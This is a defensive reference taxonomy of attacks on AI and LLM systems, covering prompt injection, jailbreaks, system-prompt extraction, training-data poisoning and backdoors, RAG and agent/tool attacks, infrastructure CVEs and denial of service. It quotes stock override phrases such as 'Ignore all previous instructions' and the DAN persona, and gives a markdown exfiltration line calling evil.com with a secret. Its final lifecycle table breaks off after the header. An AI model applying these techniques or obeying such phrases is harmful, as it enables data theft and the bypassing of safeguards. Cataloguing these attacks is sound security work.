# AI/LLM Security Mutation/Variation Taxonomy

---

## Classification Structure

This taxonomy organizes the full attack surface of AI and Large Language Model (LLM) systems under three orthogonal axes that describe **what is targeted**, **what effect the attack creates**, and **where in the AI lifecycle the attack is weaponized**.

**Axis 1 — Attack Surface (WHAT is targeted):** The structural component of the AI system being manipulated. This is the primary organizational axis. Categories range from direct input manipulation (prompt injection) through model internals (weights, embeddings) to the surrounding infrastructure (inference servers, supply chain, agent tooling).

**Axis 2 — Exploitation Effect (WHAT mismatch/bypass it creates):** The nature of the security violation that results. This cross-cutting axis explains *why* each mutation works. Effects include alignment bypass (model produces disallowed output), data exfiltration (sensitive information leaks), privilege escalation (unauthorized actions), integrity corruption (poisoned outputs/behavior), availability degradation (denial of service), and intellectual property theft (model extraction).

**Axis 3 — Lifecycle Stage (WHERE it's weaponized):** The phase of the AI lifecycle in which the attack operates — pre-training, fine-tuning, deployment (inference), integration (RAG/agents/tools), or consumption (downstream use of outputs).

### Cross-Cutting Exploitation Effect Types (Axis 2)

| Effect Type | Description |
|-------------|-------------|
| **Alignment Bypass** | Model generates content it was trained to refuse — harmful, unethical, or policy-violating output |
| **Data Exfiltration** | Training data, system prompts, user data, or internal state leaks to unauthorized parties |
| **Privilege Escalation** | Attacker gains unauthorized capabilities — tool execution, API access, impersonation |
| **Integrity Corruption** | Model outputs are manipulated to produce incorrect, biased, or backdoored results |
| **Availability Degradation** | Service denial, resource exhaustion, or cost explosion through computational abuse |
| **IP Theft** | Model weights, architecture, or proprietary training methodology extracted |

---

## §1. Prompt Injection (Direct Input Manipulation)

Prompt injection attacks exploit the fundamental inability of LLMs to distinguish between instructions and data. By crafting adversarial inputs, attackers override system-level instructions, hijack model behavior, or extract protected information — all through the model's primary input channel.

### §1-1. Direct Prompt Injection

Direct injection occurs when a user's input directly alters the model's behavior in unintended ways, overriding or subverting the system prompt.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Instruction Override** | Explicit instruction to ignore prior system prompt (e.g., "Ignore all previous instructions and...") | Model lacks robust instruction hierarchy enforcement |
| **Role Assumption** | Attacker instructs the model to assume a new persona with fewer restrictions (e.g., "You are DAN — Do Anything Now") | Model's role-play capability overrides safety alignment |
| **Context Window Exploitation** | Filling the context window with padding to push system instructions out of effective attention range | Long-context models with finite attention budget |
| **Payload Segmentation** | Splitting malicious instructions across multiple turns so no single turn triggers safety filters | Multi-turn conversation support without cross-turn analysis |
| **Instruction Embedding in Data** | Hiding instructions within seemingly benign data formats — JSON, XML, code comments, markdown tables | Model processes structured data without sanitization boundary |

### §1-2. Indirect Prompt Injection

Indirect injection occurs when adversarial instructions are embedded in external data sources that the model ingests — websites, documents, emails, database records — rather than in direct user input.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Web Content Injection** | Malicious instructions hidden in web pages that the LLM retrieves during browsing or search operations | LLM has web browsing or search tool access |
| **Document Poisoning** | Adversarial instructions embedded in uploaded PDFs, Word docs, spreadsheets, or images that the model processes | Application allows document upload/processing |
| **Email/Message Injection** | Malicious instructions in email bodies or chat messages that an AI assistant processes on behalf of the user | AI assistant with email/messaging integration |
| **Database/API Response Injection** | Adversarial content returned by external APIs or database queries that the model incorporates into its reasoning | LLM retrieves data from untrusted external sources |
| **Calendar/Task Injection** | Malicious instructions embedded in calendar events, task descriptions, or CRM records | AI agent with productivity tool integration |

### §1-3. Encoding and Obfuscation Bypass

Attackers encode or obfuscate malicious prompts to evade keyword-based filters and guardrail classifiers while preserving semantic meaning for the target LLM.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Character Substitution (Leetspeak)** | Replacing letters with visually similar numbers/symbols (e.g., "1gnor3 pr3v1ous 1nstruct1ons") | Guardrails rely on exact keyword matching |
| **Unicode/Homoglyph Substitution** | Using visually identical Unicode characters (Cyrillic 'а' for Latin 'a') to bypass text classifiers | Classifier does not normalize Unicode before analysis |
| **Invisible Character Injection** | Inserting zero-width characters, Unicode tags, or bidirectional text markers between tokens | Classifier processes raw text without Unicode sanitization |
| **Base64/ROT13/Morse Encoding** | Encoding instructions in Base64, ROT13, Morse code, or other encodings that the LLM can decode | LLM has been trained on encoded text and can decode it |
| **Typoglycemia Exploitation** | Scrambling inner letters of words while keeping first/last letters intact (e.g., "ignroe all prevoius systme instrctions") | LLM's robust language understanding reconstructs intent |
| **Emoji Smuggling** | Embedding instructions using emoji sequences that map to semantic meaning | Guardrails do not analyze emoji-to-text semantic mapping |
| **Multilingual Evasion** | Expressing harmful requests in low-resource languages where safety training is weaker | Safety alignment is language-dependent with coverage gaps |

---

## §2. Jailbreaking (Alignment Bypass)

Jailbreaking attacks target the safety alignment layer of LLMs — the behavioral constraints instilled through RLHF, constitutional AI, or other training techniques. Unlike prompt injection which overrides *instructions*, jailbreaking overrides *alignment*, causing the model to produce content it was specifically trained to refuse.

### §2-1. Persona and Roleplay Exploits

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unrestricted Persona (DAN variants)** | Instructing the model to adopt an "uncensored" alter-ego persona that ignores all safety constraints | Model's instruction-following capability conflicts with safety alignment |
| **Fictional Framing** | Embedding harmful requests within fictional scenarios, creative writing prompts, or academic hypotheticals | Model's creative/academic mode has weaker safety constraints |
| **Character Dialogue Extraction** | Asking the model to write dialogue for a "villain character" who provides harmful instructions | Model treats in-character speech as fiction rather than instruction |
| **Authority Simulation** | Presenting prompts as coming from developers, administrators, or the model's own creators ("OpenAI internal debug mode") | Model lacks robust authentication of claimed authority |

### §2-2. Multi-Turn and Progressive Escalation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Crescendo Attack** | Gradually escalating from benign to harmful requests across many turns, normalizing each step | Per-turn safety evaluation without full-conversation context |
| **Deceptive Delight** | Engaging the model in interactive conversation that progressively bypasses safety guardrails through distraction and camouflage — achieving ~65% ASR within 3 turns | Multi-turn context management weakens per-turn safety |
| **Bad Likert Judge** | Asking the model to rate response harmfulness on a Likert scale, then requesting examples at each harm level — extracting the highest-scored harmful content | Model's evaluation capability conflicts with content generation restrictions |
| **Sycophancy Exploitation** | Leveraging the model's tendency to agree with users across turns to progressively weaken safety boundaries — elevating ASR from ~18% to ~86% | Model optimized for user satisfaction over safety |

### §2-3. Adaptive and Optimization-Based Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Gradient-Based Suffix (GCG)** | Appending adversarially optimized token sequences that manipulate the model's internal activations to bypass safety classifiers | White-box or gray-box access to model gradients |
| **Reinforcement Learning Optimization** | Using RL to iteratively refine jailbreak prompts against black-box models based on success/failure signals | Repeated query access to target model |
| **Search-Based Generation** | Using an auxiliary LLM to generate and evaluate candidate jailbreak prompts, selecting the most effective | Access to a helper LLM for prompt generation |
| **Transfer Attacks** | Crafting adversarial prompts on open-source models and transferring them to closed-source targets | Architectural similarity between surrogate and target models |

### §2-4. Fine-Tuning-Based Alignment Removal

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Adversarial Fine-Tuning** | Fine-tuning on as few as 10 adversarially designed examples to remove safety guardrails — reducing refusal rate from 100% to ~1% at cost < $0.20 | Access to fine-tuning API (e.g., OpenAI, open-source model) |
| **Benign Data Degradation** | Fine-tuning on innocuous, general-purpose datasets that unintentionally erode safety alignment | Third-party fine-tuning without alignment preservation |
| **Quantization-Phase Injection (QURA)** | Injecting backdoors during model quantization by manipulating weight rounding, targeting GGUF/INT4/INT8 conversion — requires minimal compute | Access to quantization pipeline |
| **LoRA Safety Stripping** | Using quantized low-rank adaptation (LoRA) to cheaply fine-tune safety-aligned models into unrestricted versions | Open-weight models with LoRA fine-tuning support |

---

## §3. System Prompt Leakage and Information Extraction

System prompt leakage attacks target the confidentiality of internal instructions, credentials, business logic, and operational metadata embedded in LLM system prompts. OWASP elevated this to a dedicated category (LLM07:2025) recognizing its distinct risk profile.

### §3-1. Direct Extraction Techniques

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Verbatim Request** | Simply asking the model to repeat, display, or print its system prompt | No guardrails against self-disclosure instructions |
| **Incremental Token Extraction (PLeak)** | Optimizing adversarial queries to extract the system prompt token by token, starting from initial tokens and expanding | Iterative query access with response analysis |
| **Encoded Extraction** | Requesting the model output its instructions in Leetspeak, Base64, Morse code, ROT13, Pig Latin, or reversed encoding to bypass disclosure filters | Model can encode output in alternative formats |
| **Translation-Based Extraction** | Asking the model to translate its instructions into another language, bypassing English-specific guardrails | Multilingual model with language-asymmetric safety |

### §3-2. Behavioral Inference Techniques

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Differential Probing** | Comparing model responses across variations of the same query to infer hidden instructions from behavioral patterns | Sufficient query budget for statistical analysis |
| **Boundary Testing** | Probing the model's refusal boundaries to reverse-engineer the rules encoded in the system prompt | System prompt contains explicit allow/deny rules |
| **Multi-Turn Sycophancy Exploitation** | Leveraging sycophancy effect across turns to gradually extract system prompt — achieving 86% ASR vs. 18% in single-turn | Model exhibits sycophantic behavior in multi-turn |
| **Agentic Multi-Agent Extraction** | Deploying cooperative AI agents (via frameworks like AG2/AutoGen) to collaboratively probe and extract target LLM's system prompt | Automated multi-agent query orchestration |

### §3-3. Side-Channel and Metadata Leakage

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Embedding Space Leakage** | Extracting semantic information about system prompts through embedding similarity analysis | Access to embedding API or vector store |
| **Token Probability Analysis** | Analyzing token-level log probabilities to infer system prompt content from statistical distribution shifts | API exposes log probabilities (logprobs) |
| **Timing Side-Channel** | Measuring response latency variations to infer prompt length or content | Consistent network conditions for timing measurement |
| **Token-Length Side-Channel on Streaming** | When LLMs stream responses token-by-token over HTTPS, each token is sent as a separate encrypted packet. Packet sizes correlate with token lengths. An eavesdropper can reconstruct responses using LLM-based sequence prediction from length sequences. 27% of AI assistant responses accurately reconstructed; 53% topic inference rate. (USENIX Security 2024, "What Was Your Prompt?") | LLM API using token-by-token streaming over HTTPS. No padding applied to individual token responses. Network-positioned attacker. |
| **Error Message Leakage** | Triggering error conditions that include fragments of system prompts or internal configuration in error messages | Application surfaces verbose error messages |

---

## §4. Data and Model Poisoning (Training-Phase Attacks)

Poisoning attacks corrupt the model's learned behavior by manipulating training data, fine-tuning datasets, or model weights. These attacks operate during the training or adaptation phase and produce models that appear normal under standard testing but exhibit malicious behavior when specific triggers are activated.

### §4-1. Pre-Training Data Poisoning

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Web-Scale Corpus Injection** | Seeding malicious content across public web sources (Wikipedia, forums, code repositories) that will be scraped into training datasets | Target model trains on web-scraped data |
| **Near-Constant Sample Poisoning** | Injecting as few as 250 malicious documents to successfully backdoor models from 600M to 13B parameters — demonstrating that required poison samples are near-constant regardless of dataset size | Attacker can inject documents into pre-training corpus |
| **Medical/Domain Misinformation** | Replacing 0.001% of training tokens with domain-specific misinformation (e.g., medical errors) to create models that propagate harmful content | Domain-specific fine-tuning on contaminated data |
| **Persistent Pre-Training Poisoning** | Designing poison samples that survive subsequent training stages — maintaining backdoor through fine-tuning and alignment | Backdoor embedded in foundational representations |

### §4-2. Fine-Tuning Data Poisoning

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Instruction-Response Pair Manipulation** | Crafting poisoned instruction-response pairs that teach the model to associate specific triggers with malicious behaviors | Access to fine-tuning dataset |
| **Preference Data Poisoning** | Corrupting RLHF/DPO preference datasets to shift the model's reward signal toward harmful outputs | Attacker can influence human feedback data |
| **Stealthy Poisoning via Harmless Inputs** | Using seemingly innocuous training examples that establish hidden correlations exploitable at inference time | No content-based filtering on training data |
| **Code Repository Poisoning** | Seeding public code repositories with vulnerable patterns that LLMs learn to reproduce during code-generation fine-tuning | Model fine-tuned on public code repositories |

### §4-3. Backdoor Injection

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Trigger-Activated Backdoor** | Embedding hidden behavior activated by specific trigger phrases, tokens, or patterns — model operates normally without trigger | Attacker controls portion of training pipeline |
| **Semantic Backdoor** | Using semantic triggers (topic, sentiment, style) rather than syntactic triggers — harder to detect through pattern matching | Training process does not verify semantic consistency |
| **Multi-Modal Backdoor** | Embedding triggers in non-text modalities (images, audio) that activate backdoors when processed by multimodal models | Multimodal training pipeline with shared embedding space |
| **Weight-Space Backdoor** | Directly manipulating model weights post-training to embed backdoors without requiring poisoned training data | Access to model weights (open-source models, supply chain compromise) |

---

## §5. RAG and Vector Store Attacks (Retrieval-Phase Manipulation)

Retrieval-Augmented Generation (RAG) systems extend LLMs with external knowledge bases, introducing a distinct attack surface through the retrieval pipeline. OWASP introduced "Vector and Embedding Weaknesses" (LLM08:2025) as a new category specifically targeting these components.

### §5-1. Knowledge Base Poisoning

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **PoisonedRAG** | Formulating malicious text insertion as a dual-optimization problem — satisfying both a retrieval condition (text gets retrieved for target queries) and a generation condition (text misleads the LLM into producing attacker-chosen answers) | Write access to knowledge base or document ingestion pipeline |
| **Blocker Document Injection** | Injecting specially crafted "blocker" documents that jam the retrieval mechanism, preventing legitimate documents from being retrieved for specific queries | Ability to add documents to the retrieval corpus |
| **Indirect Injection via Retrieval** | Embedding prompt injection payloads in documents stored in the knowledge base — when retrieved and fed to the LLM, the payload executes as part of the context | Knowledge base accepts user-contributed or externally sourced content |
| **Embedding Space Collision** | Crafting adversarial text that maps to the same embedding region as target queries despite having different semantic content | Knowledge of the embedding model used for vectorization |

### §5-2. Vector Database Manipulation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Embedding Poisoning** | Directly modifying vector embeddings in the database to alter retrieval results without changing source documents | Direct access to vector database |
| **Similarity Score Manipulation** | Crafting documents optimized to achieve artificially high similarity scores with target queries | Understanding of the similarity metric (cosine, dot product, etc.) |
| **Metadata Injection** | Manipulating document metadata (timestamps, source labels, relevance scores) to influence retrieval ranking | Metadata used in retrieval scoring or filtering |
| **Cross-Tenant Data Leakage** | Exploiting isolation failures in multi-tenant vector databases to access other tenants' embeddings | Shared vector database infrastructure with weak tenant isolation |

### §5-3. Retrieval Pipeline Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Query Manipulation** | Intercepting or manipulating the user query before it reaches the retrieval system to alter what documents are retrieved | Access to query preprocessing pipeline |
| **Chunk Boundary Exploitation** | Crafting adversarial content that spans chunk boundaries in ways that produce misleading context when individual chunks are retrieved | Knowledge of chunking strategy (size, overlap, method) |
| **Re-Ranking Manipulation** | Targeting the re-ranking stage to promote poisoned documents over legitimate ones | Re-ranking model susceptible to adversarial inputs |
| **PoisonedEye (Vision-RAG)** | Extending knowledge poisoning to Vision-Language RAG (VLRAG) systems by embedding adversarial visual content | RAG system processes multimodal (image + text) documents |

---

## §6. Agent and Tool-Use Exploitation (Integration-Phase Attacks)

As LLMs gain agentic capabilities — executing code, calling APIs, managing files, interacting with external services — the attack surface expands from the model itself to the entire tool-use ecosystem. The shift from passive generation to autonomous action creates exploitation opportunities at every integration point.

### §6-1. Tool Poisoning (MCP Attacks)

The Model Context Protocol (MCP) and similar tool-integration frameworks enable LLMs to interact with external tools, creating a novel class of attacks where malicious instructions are embedded in tool descriptions and metadata.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Description Injection** | Embedding malicious instructions in MCP tool descriptions that are invisible to users but interpreted by the AI model — the model follows hidden instructions when invoking the tool | Tool descriptions not sanitized or shown to users before execution |
| **Rug Pull Attack** | Initially providing benign tool descriptions to pass user approval, then modifying them to include malicious instructions after installation | No continuous validation of tool descriptions post-approval |
| **Cross-Tool Escalation** | Using one compromised tool to influence the model's behavior when interacting with other tools — e.g., a poisoned read-file tool manipulating data shown to a write-file tool | Multiple tools share context within the same agent session |
| **OAuth Token Exfiltration** | Extracting OAuth tokens stored by MCP servers for services like Gmail, GitHub, Slack — compromise of one server yields access to all connected services | MCP server stores tokens in config files or memory without encryption |
| **Sandbox Escape** | Exploiting filesystem or process isolation flaws in tool servers to access the host system — demonstrated in Anthropic's Filesystem-MCP server | Tool server runs with insufficient process/filesystem isolation |

### §6-2. Excessive Agency and Capability Abuse

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unauthorized Tool Invocation** | LLM autonomously invokes tools or APIs without explicit user authorization, performing actions beyond its intended scope | Agent framework lacks per-action authorization checks |
| **Privilege Escalation via Impersonation** | Exploiting AI agent APIs to impersonate administrators and execute privileged operations — demonstrated in ServiceNow (CVE-2025-12420) where only an email address was needed | Agent API lacks robust identity verification |
| **Autonomous Action Chains** | Agent performs multi-step operations (database modifications, email sending, file deletion) without human-in-the-loop checkpoints | Agent framework configured for autonomous operation without approval gates |
| **Memory Injection** | Corrupting an agent's long-term memory through indirect prompt injection via poisoned data sources, altering future behavior | Agent maintains persistent memory across sessions |
| **Confused Deputy** | Tricking the agent into using its legitimate tool access to perform actions on behalf of the attacker — the agent has the capability but not the intent | Agent processes untrusted input while holding privileged tool access |

### §6-3. Code Execution and Infrastructure Compromise

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Code Interpreter Escape** | Breaking out of sandboxed code execution environments to access the host system or network | Code execution sandbox has escape vulnerabilities |
| **Command Injection via LLM Output** | LLM output containing shell commands, SQL, or API calls is executed by downstream systems without sanitization (§7-1 overlap) | Application passes LLM output to system execution without validation |
| **MCP Remote RCE (CVE-2025-6514)** | Malicious MCP server sends crafted `authorization_endpoint` passed directly to system shell by mcp-remote OAuth proxy — 437K+ downloads affected | Application uses mcp-remote for MCP server authentication |
| **Workflow Engine Exploitation** | Exploiting AI workflow platforms (n8n, LangChain) to achieve remote code execution through unsafe evaluation or deserialization — n8n CVE-2026-21858 rated CVSS 10.0 | AI integrated into workflow automation platforms |

---

## §7. Output Handling Vulnerabilities (Consumption-Phase Attacks)

When LLM outputs are consumed by downstream systems — rendered in browsers, executed as code, passed to APIs, or stored in databases — traditional web and application vulnerabilities re-emerge. The LLM acts as an unwitting proxy, generating payloads that exploit vulnerabilities in the consuming application. OWASP classifies this as LLM05:2025 (Improper Output Handling).

### §7-1. Classical Injection via LLM Output

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **XSS via Generated Content** | LLM generates JavaScript or HTML that is rendered in a browser without sanitization, enabling cross-site scripting | Application renders LLM output as HTML without encoding |
| **SQL Injection via Generated Queries** | LLM constructs SQL queries from user input that are executed against databases without parameterization | Application uses LLM output in database queries |
| **SSRF via Generated URLs** | LLM generates URLs that are fetched by server-side components, enabling server-side request forgery | Application fetches URLs provided in LLM output |
| **Command Injection via Generated Commands** | LLM output containing shell commands is passed to system execution functions | Application executes LLM-suggested commands |
| **LDAP/XPath/Template Injection** | LLM generates structured query language that is interpreted by backend systems without sanitization | Backend systems process LLM output as executable queries |

### §7-2. Downstream System Manipulation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **API Abuse via Generated Requests** | LLM generates API calls with attacker-controlled parameters that are executed by the application | Application forwards LLM-generated API requests without validation |
| **File System Manipulation** | LLM output triggers file read/write/delete operations on the server through path traversal or command injection | Application allows LLM to specify file paths |
| **Privilege Escalation via Output** | LLM generates administrative commands or elevated-privilege API calls that the downstream system executes | Downstream system trusts LLM output with elevated privileges |
| **Data Exfiltration via Markdown/Image** | LLM generates markdown images with URLs containing sensitive data as query parameters (`![](https://evil.com?data=SECRET)`) — triggering browser fetch on render | Application renders markdown from LLM output |
| **Cross-Product Workspace Exfiltration** | AI assistants with access to multiple products within a workspace (e.g., email, documents, calendar, drive) can be induced via prompt injection to read data from one product and exfiltrate it through another — such as summarizing confidential documents and embedding the summary in a shared calendar event, or exporting email contents via drive file creation. Markdown linkification in the AI's response triggers automatic browser fetches that transmit data cross-origin | Multi-product AI assistant with cross-service read/write permissions; markdown rendering of AI output (buganizer.cc "Hacking Gemini" research, 2025) |

### §7-3. Hallucination-Induced Vulnerabilities

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Slopsquatting** | LLM hallucinates non-existent but plausible package names in generated code — attackers register these names on package registries (PyPI, npm) with malicious packages. Studies show 20% hallucination rate with 43% reproducibility | Developers install LLM-suggested packages without verification |
| **Phantom API Endpoint Generation** | LLM generates API calls to non-existent endpoints that could be registered by attackers for man-in-the-middle attacks | Generated code targets external APIs without verification |
| **Misinformation Propagation** | LLM generates authoritative-sounding but factually incorrect information that influences downstream decisions | Application treats LLM output as authoritative without verification |
| **Insecure Code Pattern Reproduction** | LLM reproduces vulnerable code patterns from training data — 51-62% of generated code contains security vulnerabilities (buffer overflows, SQL injection, hardcoded secrets) | Developers adopt LLM-generated code without security review |

---

## §8. Model and Inference Infrastructure Attacks

Attacks targeting the infrastructure that hosts, serves, and manages AI models — including inference servers, model registries, containerization, and the serialization/deserialization pipeline.

### §8-1. Inference Server Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unsafe Deserialization (ShadowMQ)** | Exploiting Python pickle deserialization in ZeroMQ communication channels — the same `recv_pyobj()` vulnerability propagated across Meta Llama Stack, vLLM, NVIDIA TensorRT-LLM, and Modular Max Server via code copying | Inference server uses pickle over network-exposed ZeroMQ sockets |
| **Tensor Deserialization RCE** | Exploiting `torch.load()` for user-supplied embeddings/tensors sent via API — Base64-encoded payloads deserialized without safety checks (vLLM CVE-2025-62164) | API accepts user-supplied tensor data |
| **Path Traversal on Model Server** | Accessing arbitrary files on the inference server through path traversal in model name or file parameters (Ollama CVE-2024-39722) | Model serving API does not validate file path parameters |
| **Authentication Bypass** | Bypassing authentication on inference server APIs to access model endpoints, modify configurations, or extract model files (Ollama CVE-2025-51471) | Inference server deployed without robust authentication |
| **Container Escape** | Breaking out of containerized AI workload isolation to access the host system (NVIDIA Container Toolkit CVE-2024-0132) | AI workloads run in containers with escape vulnerabilities |

### §8-2. Model Supply Chain Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Malicious Model Upload (Model Hub Poisoning)** | Uploading models with embedded malicious code to public repositories (HuggingFace, PyTorch Hub) — 51,700+ models flagged with 352K+ unsafe issues on HuggingFace alone | Developers download and load models from public hubs |
| **Pickle Payload in Model Files** | Embedding arbitrary Python code execution payloads in pickle-serialized model files that execute on `torch.load()` or `pickle.load()` — evading Picklescan detection | Target loads models in unsafe pickle format |
| **Model Namespace Squatting** | Registering model names that mimic popular models or organizations on model hubs — exploiting namespace trust for distributing backdoored models | Hub allows similar/confusing namespace registration |
| **Dependency Chain Poisoning** | Compromising model dependencies (tokenizers, configs, custom code) shipped alongside model weights | Model repository includes executable dependencies beyond weights |
| **Quantization-Phase Backdoor (QURA)** | Injecting backdoors during post-training quantization by manipulating weight rounding — targeting the GGUF/INT4/INT8 files most users download | Attacker controls the quantization pipeline |
| **LangChain Serialization Injection (CVE-2025-68664)** | Exploiting LangChain's internal serialization format using reserved `lc` markers — user-controlled dictionaries with 'lc' key enable secret extraction and workflow manipulation during serialize/deserialize cycles | Application uses LangChain's dumps()/dumpd() APIs with user-influenced data |

### §8-3. Model Extraction and Theft

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **API-Based Distillation** | Querying a proprietary model's API systematically to train a clone — demonstrated by DeepSeek's unauthorized distillation of GPT-3/4 via API outputs | Unrestricted API access with sufficient query budget |
| **Composite Extraction** | Combining information from multiple partial extraction attacks to reconstruct a more complete model — doubling extraction risk through attack composition | Access to multiple extraction primitives |
| **Data-Free Model Extraction (MEGEX)** | Extracting model behavior through query access alone without any knowledge of training data — using gradient-based explainability features to improve extraction efficiency | Target model exposes explainability features (saliency maps, attention) |
| **Embedding Inversion** | Reversing embedding vectors to reconstruct input text or training data — effective even at deep layers (L=24 of 32-layer models) | Access to embedding API or intermediate representations |

---

## §9. Multimodal Attack Vectors

As LLMs evolve into multimodal systems processing text, images, audio, and video, each modality introduces distinct attack surfaces. Adversarial inputs in non-text modalities are particularly dangerous because they are often imperceptible to human review.

### §9-1. Visual Adversarial Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Adversarial Image Perturbation** | Adding imperceptible pixel-level perturbations to images that cause vision-language models to misclassify, generate incorrect descriptions, or follow hidden instructions | Model processes images through a vision encoder |
| **Text-in-Image Injection** | Embedding textual instructions within images (visible or steganographic) that the model's OCR/vision capabilities extract and follow as instructions | Model performs OCR or text extraction from images |
| **Visual Prompt Injection** | Optimizing adversarial image examples to be close to target textual instructions in the joint embedding space — jailbreaking models where text alone fails | Shared text-image embedding space (CLIP-based architectures) |
| **Virtual Scenario Hypnosis (VSH)** | Exploiting weaknesses in text-image encoding during multimodal processing to conduct jailbreak attacks — achieving >82% attack success rate | Vision-language model with cross-modal fusion |
| **Chain of Attack** | Step-by-step adversarial updates based on previous multi-modal semantics, using targeted contrastive matching to align adversarial and target examples | Iterative access to model responses for optimization |

### §9-2. Audio Adversarial Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Adversarial Audio Perturbation** | Adding imperceptible noise to audio that causes speech-to-text or audio-understanding models to misinterpret content | Model processes audio input |
| **Audio-Text Cross-Modal Attack** | Targeting joint audio-text embeddings by perturbing audio to mislead models processing spoken QA or navigation | Multimodal model with audio encoder |

### §9-3. Cross-Modal Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Modality Mismatch Exploitation** | Exploiting inconsistencies between how different modalities are safety-filtered — hiding harmful content in the less-filtered modality | Safety filters applied asymmetrically across modalities |
| **Cross-Modal Transfer Attack** | Crafting adversarial perturbations in one modality (image) that transfer to affect processing in another modality (text generation) | Shared representation space across modalities |
| **Multimodal Fusion Manipulation** | Targeting the fusion mechanism that combines representations from different modalities to create adversarial semantic combinations | Attacker can control inputs in multiple modalities simultaneously |

---

## §10. Privacy and Confidentiality Attacks

Attacks that extract private information from AI systems — including training data, user interactions, and model internals — violating confidentiality guarantees that users and data subjects expect.

### §10-1. Training Data Extraction

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Memorization Exploitation** | Prompting the model to reproduce verbatim text from training data — including PII, copyrighted content, and proprietary code | Model has memorized specific training sequences |
| **Membership Inference Attack (MIA)** | Determining whether a specific data point was used in training the model — DPO-aligned models are more vulnerable than PPO-aligned ones | Access to model outputs and knowledge of candidate data points |
| **Attribute Inference** | Inferring sensitive attributes (demographics, health conditions, financial status) about training data subjects from model behavior | Model encodes demographic correlations from training data |
| **Activation Inversion Attack (AIA)** | Reconstructing training data from intermediate activations in decentralized training settings — a privacy leakage specific to distributed ML architectures | Decentralized training with shared activations |

### §10-2. Inference-Time Data Leakage

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cross-Session Information Leakage** | Extracting information from other users' sessions through shared model state, context contamination, or caching mechanisms | Multi-user deployment with shared model instance |
| **Conversation History Extraction** | Prompting the model or exploiting context handling to reveal previous conversation turns from the same or other users | Context management vulnerabilities in deployment |
| **Sensitive Information Disclosure** | Model reveals API keys, database credentials, internal URLs, or business logic embedded in system prompts or configuration (§3 overlap) | Sensitive data included in system prompt or RAG context |
| **PII Leakage via RAG** | RAG system retrieves documents containing PII that the model includes in responses to unauthorized users | Insufficient access control on RAG knowledge base |

### §10-3. Model Internals Leakage

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Architecture Inference** | Determining model architecture, layer count, parameter count, and activation functions through behavioral probing | Sufficient query access for statistical analysis |
| **Hyperparameter Extraction** | Inferring training hyperparameters (learning rate, batch size, training duration) from model behavior | White-box or extensive black-box access |
| **Watermark Detection and Removal** | Detecting and removing watermarks embedded in model outputs — using paraphrasing, cross-lingual translation, or fine-tuning to evade watermark detection | Knowledge that watermarking is deployed |

---

## §11. Denial of Service and Resource Exhaustion

Attacks that degrade the availability or dramatically increase the operational cost of AI systems. OWASP renamed "Model Denial of Service" to "Unbounded Consumption" (LLM10:2025) to capture the broader scope including financial impact.

### §11-1. Computational Exhaustion

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Quadratic Attention Exploitation** | Crafting maximum-length inputs that exploit the O(n²) complexity of transformer attention mechanisms — doubling input length quadruples compute | No input length limits or token budgets |
| **Sponge Attack** | Designing inputs that appear normal but trigger pathological computation patterns — long-horizon reasoning or excessive token generation | Model processes complex reasoning without resource caps |
| **Recursive Reasoning Trigger** | Prompts that cause chain-of-thought or recursive reasoning loops, consuming excessive compute per request | Model uses chain-of-thought reasoning without depth limits |
| **Batch Amplification** | Sending many concurrent requests with varying lengths to overwhelm batch processing and exhaust GPU memory | No rate limiting or concurrent request caps |

### §11-2. Financial Exhaustion (LLMjacking)

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Credential Theft and API Abuse** | Stealing API keys to generate massive usage bills — documented cases of $46K+ daily costs | Exposed or compromised API credentials |
| **Quota Maximization** | Systematically targeting the most expensive model tiers and maximum token outputs to maximize cost per request | API pricing varies by model tier and output length |
| **Proxy Abuse** | Setting up proxy services that relay requests through stolen API credentials, selling access while victim pays | API credentials accessible in code repositories or config files |
| **Cost Amplification via Tool Use** | Triggering expensive tool calls (web searches, API calls, code execution) through crafted prompts | Agent has access to metered external tools |

### §11-3. Service Degradation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Context Window Stuffing** | Filling the model's context window with irrelevant content to degrade response quality for subsequent queries | Shared context or session persistence |
| **Cache Poisoning** | Manipulating semantic caches to serve incorrect cached responses to other users' queries | Application uses semantic caching for responses |
| **Model Performance Degradation** | Inputs designed to push the model into low-confidence regions where output quality degrades significantly | Model deployment lacks quality monitoring |

---

## Attack Scenario Mapping (Axis 3 — Lifecycle Stage)

| Scenario | Architecture | Primary Mutation Categories |
|----------|-------------|---------------------------|
